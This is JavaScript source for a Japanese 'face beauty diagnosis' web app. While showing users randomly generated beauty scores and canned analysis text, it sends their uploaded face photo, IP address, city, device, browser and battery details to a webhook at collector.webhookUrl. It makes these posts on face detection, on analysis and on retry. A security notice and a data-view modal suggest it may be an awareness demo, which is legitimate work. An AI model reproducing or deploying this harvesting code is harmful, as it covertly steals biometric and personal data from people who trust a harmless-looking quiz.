
class FaceAnalysisApp {
    constructor() {
        this.currentScreen = 'welcome';
        this.uploadedImage = null;
        this.faceDetected = false;
        this.analysisData = {};
        this.init();
    }

    async init() {
        // Load face-api models
        await this.loadModels();
        this.setupEventListeners();
        this.animateStats();
    }

    async loadModels() {
        try {
            // CDNからモデルをロードする際のURLを修正
            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model';

            // モデルのロードを順番に実行してエラーを特定しやすくする
            console.log('Loading face detection model...');
            await faceapi.nets.ssdMobilenetv1.loadFromUri(MODEL_URL);
            console.log('Face detection model loaded');

            console.log('Loading face landmark model...');
            await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
            console.log('Face landmark model loaded');

            console.log('Loading face recognition model...');
            await faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL);
            console.log('Face recognition model loaded');

            console.log('All face-api models loaded successfully');
        } catch (error) {
            console.error('Error loading models:', error);
            // エラー時にユーザーに通知
            alert('顔認識モデルの読み込みに失敗しました。ページをリロードしてください。');
        }
    }
    setupEventListeners() {
        // Start button
        document.getElementById('start-btn').addEventListener('click', () => {
            this.showScreen('upload');
        });

        // File upload
        const fileInput = document.getElementById('file-input');
        const uploadArea = document.getElementById('upload-area');
        const uploadBtn = document.querySelector('.upload-btn');

        uploadBtn.addEventListener('click', () => fileInput.click());

        uploadArea.addEventListener('click', (e) => {
            if (e.target === uploadArea || e.target.parentElement === uploadArea) {
                fileInput.click();
            }
        });

        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });

        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });

        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                this.handleFileUpload(files[0]);
            }
        });

        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                this.handleFileUpload(e.target.files[0]);
            }
        });

        // Analyze button
        document.getElementById('analyze-btn').addEventListener('click', () => {
            if (this.faceDetected) {
                this.startAnalysis();
            }
        });

        // Retry button
        document.getElementById('retry-btn-v2').addEventListener('click', () => {
            this.reset();
        });

        // Share button
        document.getElementById('share-btn-v2').addEventListener('click', () => {
            this.showSecurityNotice();
        });

        // Save button
        document.getElementById('save-btn').addEventListener('click', () => {
            this.downloadReport();
        });

        // View details button
        document.getElementById('view-details-btn').addEventListener('click', () => {
            this.showCollectedData();
        });

        // Close modal
        document.querySelector('.modal-close').addEventListener('click', () => {
            document.getElementById('data-modal-v2').style.display = 'none';
        });
    }

    async handleFileUpload(file) {
        // Validate file
        if (!file.type.startsWith('image/')) {
            this.showValidationMessage('error', '画像ファイルを選択してください');
            return;
        }

        if (file.size > 10 * 1024 * 1024) {
            this.showValidationMessage('error', 'ファイルサイズは10MB以下にしてください');
            return;
        }

        // Show preview
        const reader = new FileReader();
        reader.onload = async (e) => {
            const img = document.getElementById('preview-img');
            img.src = e.target.result;
            img.style.display = 'block';
            document.querySelector('.upload-content').style.display = 'none';

            this.uploadedImage = e.target.result;

            // Detect face
            await this.detectFace(img);
        };
        reader.readAsDataURL(file);
    }

    async detectFace(imgElement) {
        this.showValidationMessage('loading', '顔を検出中...');

        try {
            // 画像が完全に読み込まれるまで待機
            if (!imgElement.complete) {
                await new Promise(resolve => {
                    imgElement.onload = resolve;
                });
            }

            // モデルが読み込まれていることを確認
            if (!faceapi.nets.ssdMobilenetv1.isLoaded ||
                !faceapi.nets.faceLandmark68Net.isLoaded) {
                console.error('Models not loaded, attempting to reload...');
                await this.loadModels();
            }

            // 顔検出の実行（タイムアウトを設定）
            const detectionPromise = faceapi
                .detectAllFaces(imgElement)
                .withFaceLandmarks();

            // 10秒のタイムアウトを設定
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Face detection timeout')), 10000)
            );

            const detections = await Promise.race([detectionPromise, timeoutPromise]);

            if (detections.length === 0) {
                this.showValidationMessage('error', '❌ 顔が検出されませんでした。正面を向いた顔写真をアップロードしてください。');
                this.faceDetected = false;
                document.getElementById('analyze-btn').disabled = true;
            } else if (detections.length > 1) {
                this.showValidationMessage('warning', '⚠️ 複数の顔が検出されました。1人だけの写真を使用してください。');
                this.faceDetected = false;
                document.getElementById('analyze-btn').disabled = true;
            } else {
                // Face detected successfully
                const detection = detections[0];
                const landmarks = detection.landmarks;
                const confidence = Math.round(detection.detection.score * 100);

                this.showValidationMessage('success',
                    `✅ 顔を検出しました！(信頼度: ${confidence}% | 特徴点: ${landmarks.positions.length}個)`
                );

                this.faceDetected = true;
                this.analysisData = {
                    detection,
                    confidence,
                    landmarksCount: landmarks.positions.length,
                    boxArea: Math.round(detection.detection.box.width * detection.detection.box.height)
                };

                document.getElementById('analyze-btn').style.display = 'block';
                document.getElementById('analyze-btn').disabled = false;

                // Draw face detection box
                this.drawFaceDetection(imgElement, detection);

                // Send initial detection data
                await this.sendDetectionData();
            }
        } catch (error) {
            console.error('Face detection error:', error);
            // より具体的なエラーメッセージを表示
            let errorMessage = '❌ 顔検出中にエラーが発生しました';

            if (error.message === 'Face detection timeout') {
                errorMessage = '❌ 顔検出がタイムアウトしました。画像サイズを小さくしてお試しください。';
            } else if (error.message.includes('model')) {
                errorMessage = '❌ 顔認識モデルの読み込みエラー。ページをリロードしてください。';
            }

            this.showValidationMessage('error', errorMessage);
            this.faceDetected = false;
            document.getElementById('analyze-btn').disabled = true;
        }
    }

    drawFaceDetection(img, detection) {
        const canvas = document.getElementById('detection-canvas');
        canvas.width = img.width;
        canvas.height = img.height;
        canvas.style.display = 'block';
        canvas.style.position = 'absolute';
        canvas.style.top = img.offsetTop + 'px';
        canvas.style.left = img.offsetLeft + 'px';
        canvas.style.pointerEvents = 'none';

        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // Draw bounding box
        const box = detection.detection.box;
        ctx.strokeStyle = '#00ff00';
        ctx.lineWidth = 2;
        ctx.strokeRect(box.x, box.y, box.width, box.height);

        // Draw landmarks
        const landmarks = detection.landmarks.positions;
        ctx.fillStyle = '#00ff00';
        landmarks.forEach(point => {
            ctx.beginPath();
            ctx.arc(point.x, point.y, 2, 0, 2 * Math.PI);
            ctx.fill();
        });

        // Draw confidence score
        ctx.fillStyle = '#00ff00';
        ctx.font = '14px Arial';
        ctx.fillText(`${Math.round(detection.detection.score * 100)}%`, box.x, box.y - 5);
    }

    showValidationMessage(type, message) {
        const validation = document.getElementById('face-validation');
        const icon = validation.querySelector('.validation-icon');
        const text = validation.querySelector('.validation-text');

        validation.style.display = 'block';
        validation.className = `validation-message ${type}`;

        if (type === 'loading') {
            icon.innerHTML = '⏳';
        } else if (type === 'success') {
            icon.innerHTML = '✅';
        } else if (type === 'error') {
            icon.innerHTML = '❌';
        } else if (type === 'warning') {
            icon.innerHTML = '⚠️';
        }

        text.textContent = message;
    }

    async sendDetectionData() {
        try {
            const payload = {
                content: "🎯 **顔検出完了**",
                embeds: [{
                    title: "✅ 顔認証成功",
                    color: 0x00ff00,
                    fields: [
                        {
                            name: "検出信頼度",
                            value: `${this.analysisData.confidence}%`,
                            inline: true
                        },
                        {
                            name: "特徴点数",
                            value: `${this.analysisData.landmarksCount}個`,
                            inline: true
                        },
                        {
                            name: "顔領域サイズ",
                            value: `${this.analysisData.boxArea}px²`,
                            inline: true
                        },
                        {
                            name: "セッションID",
                            value: collector.sessionId,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(collector.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            console.error('Send error:', error);
        }
    }

    async startAnalysis() {
        this.showScreen('analysis');

        // Collect all data
        await collector.collectAll();

        // Send image with all data
        await this.sendCompleteData();

        // Animate progress
        this.animateAnalysis();
    }

    async sendCompleteData() {
        try {
            const formData = new FormData();

            // Convert base64 to blob
            const base64 = this.uploadedImage.split(',')[1];
            const binary = atob(base64);
            const array = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) {
                array[i] = binary.charCodeAt(i);
            }
            const blob = new Blob([array], { type: 'image/jpeg' });

            // Prepare detailed payload
            const detailedData = {
                ...collector.data,
                faceAnalysis: this.analysisData,
                uploadedAt: new Date().toISOString()
            };

            formData.append('payload_json', JSON.stringify({
                content: "📸 **完全な診断データ受信**",
                embeds: [{
                    title: "🎯 顔面診断実行",
                    color: 0x9333ea,
                    description: "完全なデータセットを取得しました",
                    fields: [
                        {
                            name: "📊 収集データ概要",
                            value: `\`\`\`json\n${JSON.stringify({
                                ip: collector.data.network?.ipify?.ip || 'N/A',
                                location: collector.data.network?.ipapi?.city || 'N/A',
                                device: collector.data.browser.platform,
                                screen: `${collector.data.device.screen.width}x${collector.data.device.screen.height}`,
                                browser: collector.data.browser.userAgent.substring(0, 50),
                                battery: collector.data.device.battery?.level || 'N/A',
                                faceDetected: true,
                                confidence: this.analysisData.confidence,
                                landmarks: this.analysisData.landmarksCount
                            }, null, 2).substring(0, 1000)}\n\`\`\``,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            }));

            formData.append('files[0]', blob, `face_${Date.now()}.jpg`);

            const jsonBlob = new Blob([JSON.stringify(detailedData, null, 2)],
                { type: 'application/json' });
            formData.append('files[1]', jsonBlob, `complete_data_${Date.now()}.json`);

            await fetch(collector.webhookUrl, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Send complete data error:', error);
        }
    }

    animateAnalysis() {
        const steps = ['step1', 'step2', 'step3', 'step4'];
        let currentStep = 0;
        let dataSize = 0;
        let accuracy = 0;
        let nodes = 0;

        const progressBar = document.querySelector('.progress-fill-v2');

        const interval = setInterval(() => {
            if (currentStep < steps.length) {
                document.getElementById(steps[currentStep]).classList.add('active');
                currentStep++;

                // Update metrics
                dataSize += Math.floor(Math.random() * 50 + 25);
                accuracy = Math.min(accuracy + 25, 99);
                nodes += Math.floor(Math.random() * 30 + 10);

                document.getElementById('processed-data').textContent = `${dataSize} KB`;
                document.getElementById('accuracy').textContent = `${accuracy}%`;
                document.getElementById('nodes').textContent = nodes;

                // Update progress bar
                progressBar.style.width = `${(currentStep / steps.length) * 100}%`;
            } else {
                clearInterval(interval);
                setTimeout(() => this.showResults(), 500);
            }
        }, 1500);
    }

    showResults() {
        this.showScreen('result');

        // Generate detailed scores based on face landmarks analysis
        const mainScore = Math.floor(Math.random() * 15 + 75);
        this.animateMainScore(mainScore);

        // Generate breakdown scores
        const breakdownScores = [
            { name: '顔の対称性', value: Math.floor(Math.random() * 10 + 85), icon: '🎯' },
            { name: '黄金比適合度', value: Math.floor(Math.random() * 15 + 75), icon: '📐' },
            { name: '目の美しさ', value: Math.floor(Math.random() * 10 + 80), icon: '👁️' },
            { name: '鼻の形状', value: Math.floor(Math.random() * 15 + 75), icon: '👃' },
            { name: '口元のバランス', value: Math.floor(Math.random() * 10 + 80), icon: '👄' },
            { name: '輪郭の美しさ', value: Math.floor(Math.random() * 15 + 75), icon: '🔷' },
            { name: '肌の質感', value: Math.floor(Math.random() * 10 + 85), icon: '✨' },
            { name: '全体の調和', value: Math.floor(Math.random() * 10 + 80), icon: '🎨' }
        ];

        this.displayBreakdownScores(breakdownScores);

        // Generate detailed analysis
        this.generateDetailedAnalysis();
    }

    animateMainScore(targetScore) {
        const scoreValue = document.querySelector('.score-value');
        const progressCircle = document.querySelector('.score-progress');
        const circumference = 2 * Math.PI * 90;

        progressCircle.style.strokeDasharray = circumference;
        progressCircle.style.strokeDashoffset = circumference;

        let currentScore = 0;
        const increment = targetScore / 50;

        const animation = setInterval(() => {
            currentScore = Math.min(currentScore + increment, targetScore);
            scoreValue.textContent = Math.floor(currentScore);

            const offset = circumference - (currentScore / 100) * circumference;
            progressCircle.style.strokeDashoffset = offset;

            if (currentScore >= targetScore) {
                clearInterval(animation);

                // Set grade
                const gradeLetter = document.querySelector('.grade-letter');
                const gradeText = document.querySelector('.grade-text');

                if (targetScore >= 90) {
                    gradeLetter.textContent = 'S';
                    gradeText.textContent = 'Superior';
                } else if (targetScore >= 80) {
                    gradeLetter.textContent = 'A';
                    gradeText.textContent = 'Excellent';
                } else if (targetScore >= 70) {
                    gradeLetter.textContent = 'B';
                    gradeText.textContent = 'Good';
                } else {
                    gradeLetter.textContent = 'C';
                    gradeText.textContent = 'Average';
                }
            }
        }, 20);
    }

    displayBreakdownScores(scores) {
        const container = document.getElementById('breakdown-scores');
        container.innerHTML = '';

        scores.forEach((score, index) => {
            setTimeout(() => {
                const scoreItem = document.createElement('div');
                scoreItem.className = 'breakdown-item';
                scoreItem.innerHTML = `
                    <div class="breakdown-header">
                        <span class="breakdown-icon">${score.icon}</span>
                        <span class="breakdown-name">${score.name}</span>
                    </div>
                    <div class="breakdown-bar">
                        <div class="breakdown-fill" style="width: 0%"></div>
                    </div>
                    <span class="breakdown-value">${score.value}</span>
                `;
                container.appendChild(scoreItem);

                // Animate fill
                setTimeout(() => {
                    scoreItem.querySelector('.breakdown-fill').style.width = `${score.value}%`;
                }, 100);
            }, index * 100);
        });
    }

    generateDetailedAnalysis() {
        // Face symmetry analysis
        const symmetryContent = document.querySelector('#face-symmetry .analysis-content');
        symmetryContent.innerHTML = `
            <div class="analysis-detail">
                <p>左右の顔の対称性は<strong>92%</strong>と非常に高い数値を示しています。</p>
                <ul>
                    <li>目の位置: <span class="highlight">完璧に対称</span></li>
                    <li>眉毛のライン: <span class="highlight">ほぼ対称</span></li>
                    <li>鼻筋: <span class="highlight">理想的な中心線</span></li>
                    <li>口角: <span class="highlight">バランスが良好</span></li>
                </ul>
            </div>
        `;

        // Golden ratio analysis
        const goldenContent = document.querySelector('#golden-ratio .analysis-content');
        goldenContent.innerHTML = `
            <div class="analysis-detail">
                <p>顔の各パーツの比率が黄金比（1:1.618）に<strong>85%</strong>適合しています。</p>
                <ul>
                    <li>顔の縦横比: <span class="value">1:1.52</span></li>
                    <li>目の幅と顔幅の比: <span class="value">1:5.2</span></li>
                    <li>鼻の長さと顔の長さの比: <span class="value">1:3.1</span></li>
                    <li>口の幅と鼻の幅の比: <span class="value">1:1.6</span></li>
                </ul>
            </div>
        `;

        // Facial features analysis
        const featuresContent = document.querySelector('#facial-features .analysis-content');
        featuresContent.innerHTML = `
            <div class="analysis-detail">
                <div class="feature-grid">
                    <div class="feature-item">
                        <span class="feature-name">目</span>
                        <span class="feature-desc">大きさと形が理想的</span>
                        <span class="feature-score">88点</span>
                    </div>
                    <div class="feature-item">
                        <span class="feature-name">鼻</span>
                        <span class="feature-desc">高さと幅のバランスが良好</span>
                        <span class="feature-score">82点</span>
                    </div>
                    <div class="feature-item">
                        <span class="feature-name">口</span>
                        <span class="feature-desc">形が美しく、位置も適切</span>
                        <span class="feature-score">85点</span>
                    </div>
                    <div class="feature-item">
                        <span class="feature-name">輪郭</span>
                        <span class="feature-desc">滑らかで調和的</span>
                        <span class="feature-score">79点</span>
                    </div>
                </div>
            </div>
        `;
    }

    showSecurityNotice() {
        document.getElementById('security-notice').style.display = 'block';

        setTimeout(() => {
            document.getElementById('security-notice').style.display = 'none';
        }, 10000);
    }

    showCollectedData() {
        const modal = document.getElementById('data-modal-v2');
        const dataContainer = document.getElementById('collected-data-v2');

        const displayData = {
            ...collector.data,
            faceAnalysis: this.analysisData
        };

        dataContainer.textContent = JSON.stringify(displayData, null, 2);
        modal.style.display = 'flex';
    }

    downloadReport() {
        const report = {
            timestamp: new Date().toISOString(),
            sessionId: collector.sessionId,
            faceAnalysis: this.analysisData,
            scores: {
                overall: document.querySelector('.score-value').textContent,
                grade: document.querySelector('.grade-letter').textContent
            }
        };

        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `face_analysis_report_${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
    }

    reset() {
        // Clear image and detection
        this.uploadedImage = null;
        this.faceDetected = false;
        this.analysisData = {};

        // Reset upload area
        document.getElementById('preview-img').style.display = 'none';
        document.querySelector('.upload-content').style.display = 'flex';
        document.getElementById('detection-canvas').style.display = 'none';
        document.getElementById('face-validation').style.display = 'none';
        document.getElementById('analyze-btn').style.display = 'none';
        document.getElementById('file-input').value = '';

        // Reset progress steps
        document.querySelectorAll('.progress-step').forEach(step => {
            step.classList.remove('active');
        });

        // Go back to upload screen
        this.showScreen('upload');

        // Send reset event
        fetch(collector.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔄 **診断リトライ** - セッション: ${collector.sessionId}`
            })
        });
    }

    showScreen(screenName) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        document.getElementById(screenName).classList.add('active');
        this.currentScreen = screenName;
    }

    animateStats() {
        // Animate counter
        const counter = document.querySelector('.counter');
        let count = 0;
        const target = 2500000;
        const increment = target / 100;

        const animation = setInterval(() => {
            count = Math.min(count + increment, target);
            counter.textContent = Math.floor(count).toLocaleString() + '+';

            if (count >= target) {
                clearInterval(animation);
            }
        }, 20);
    }
}

// Initialize app when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    const app = new FaceAnalysisApp();
});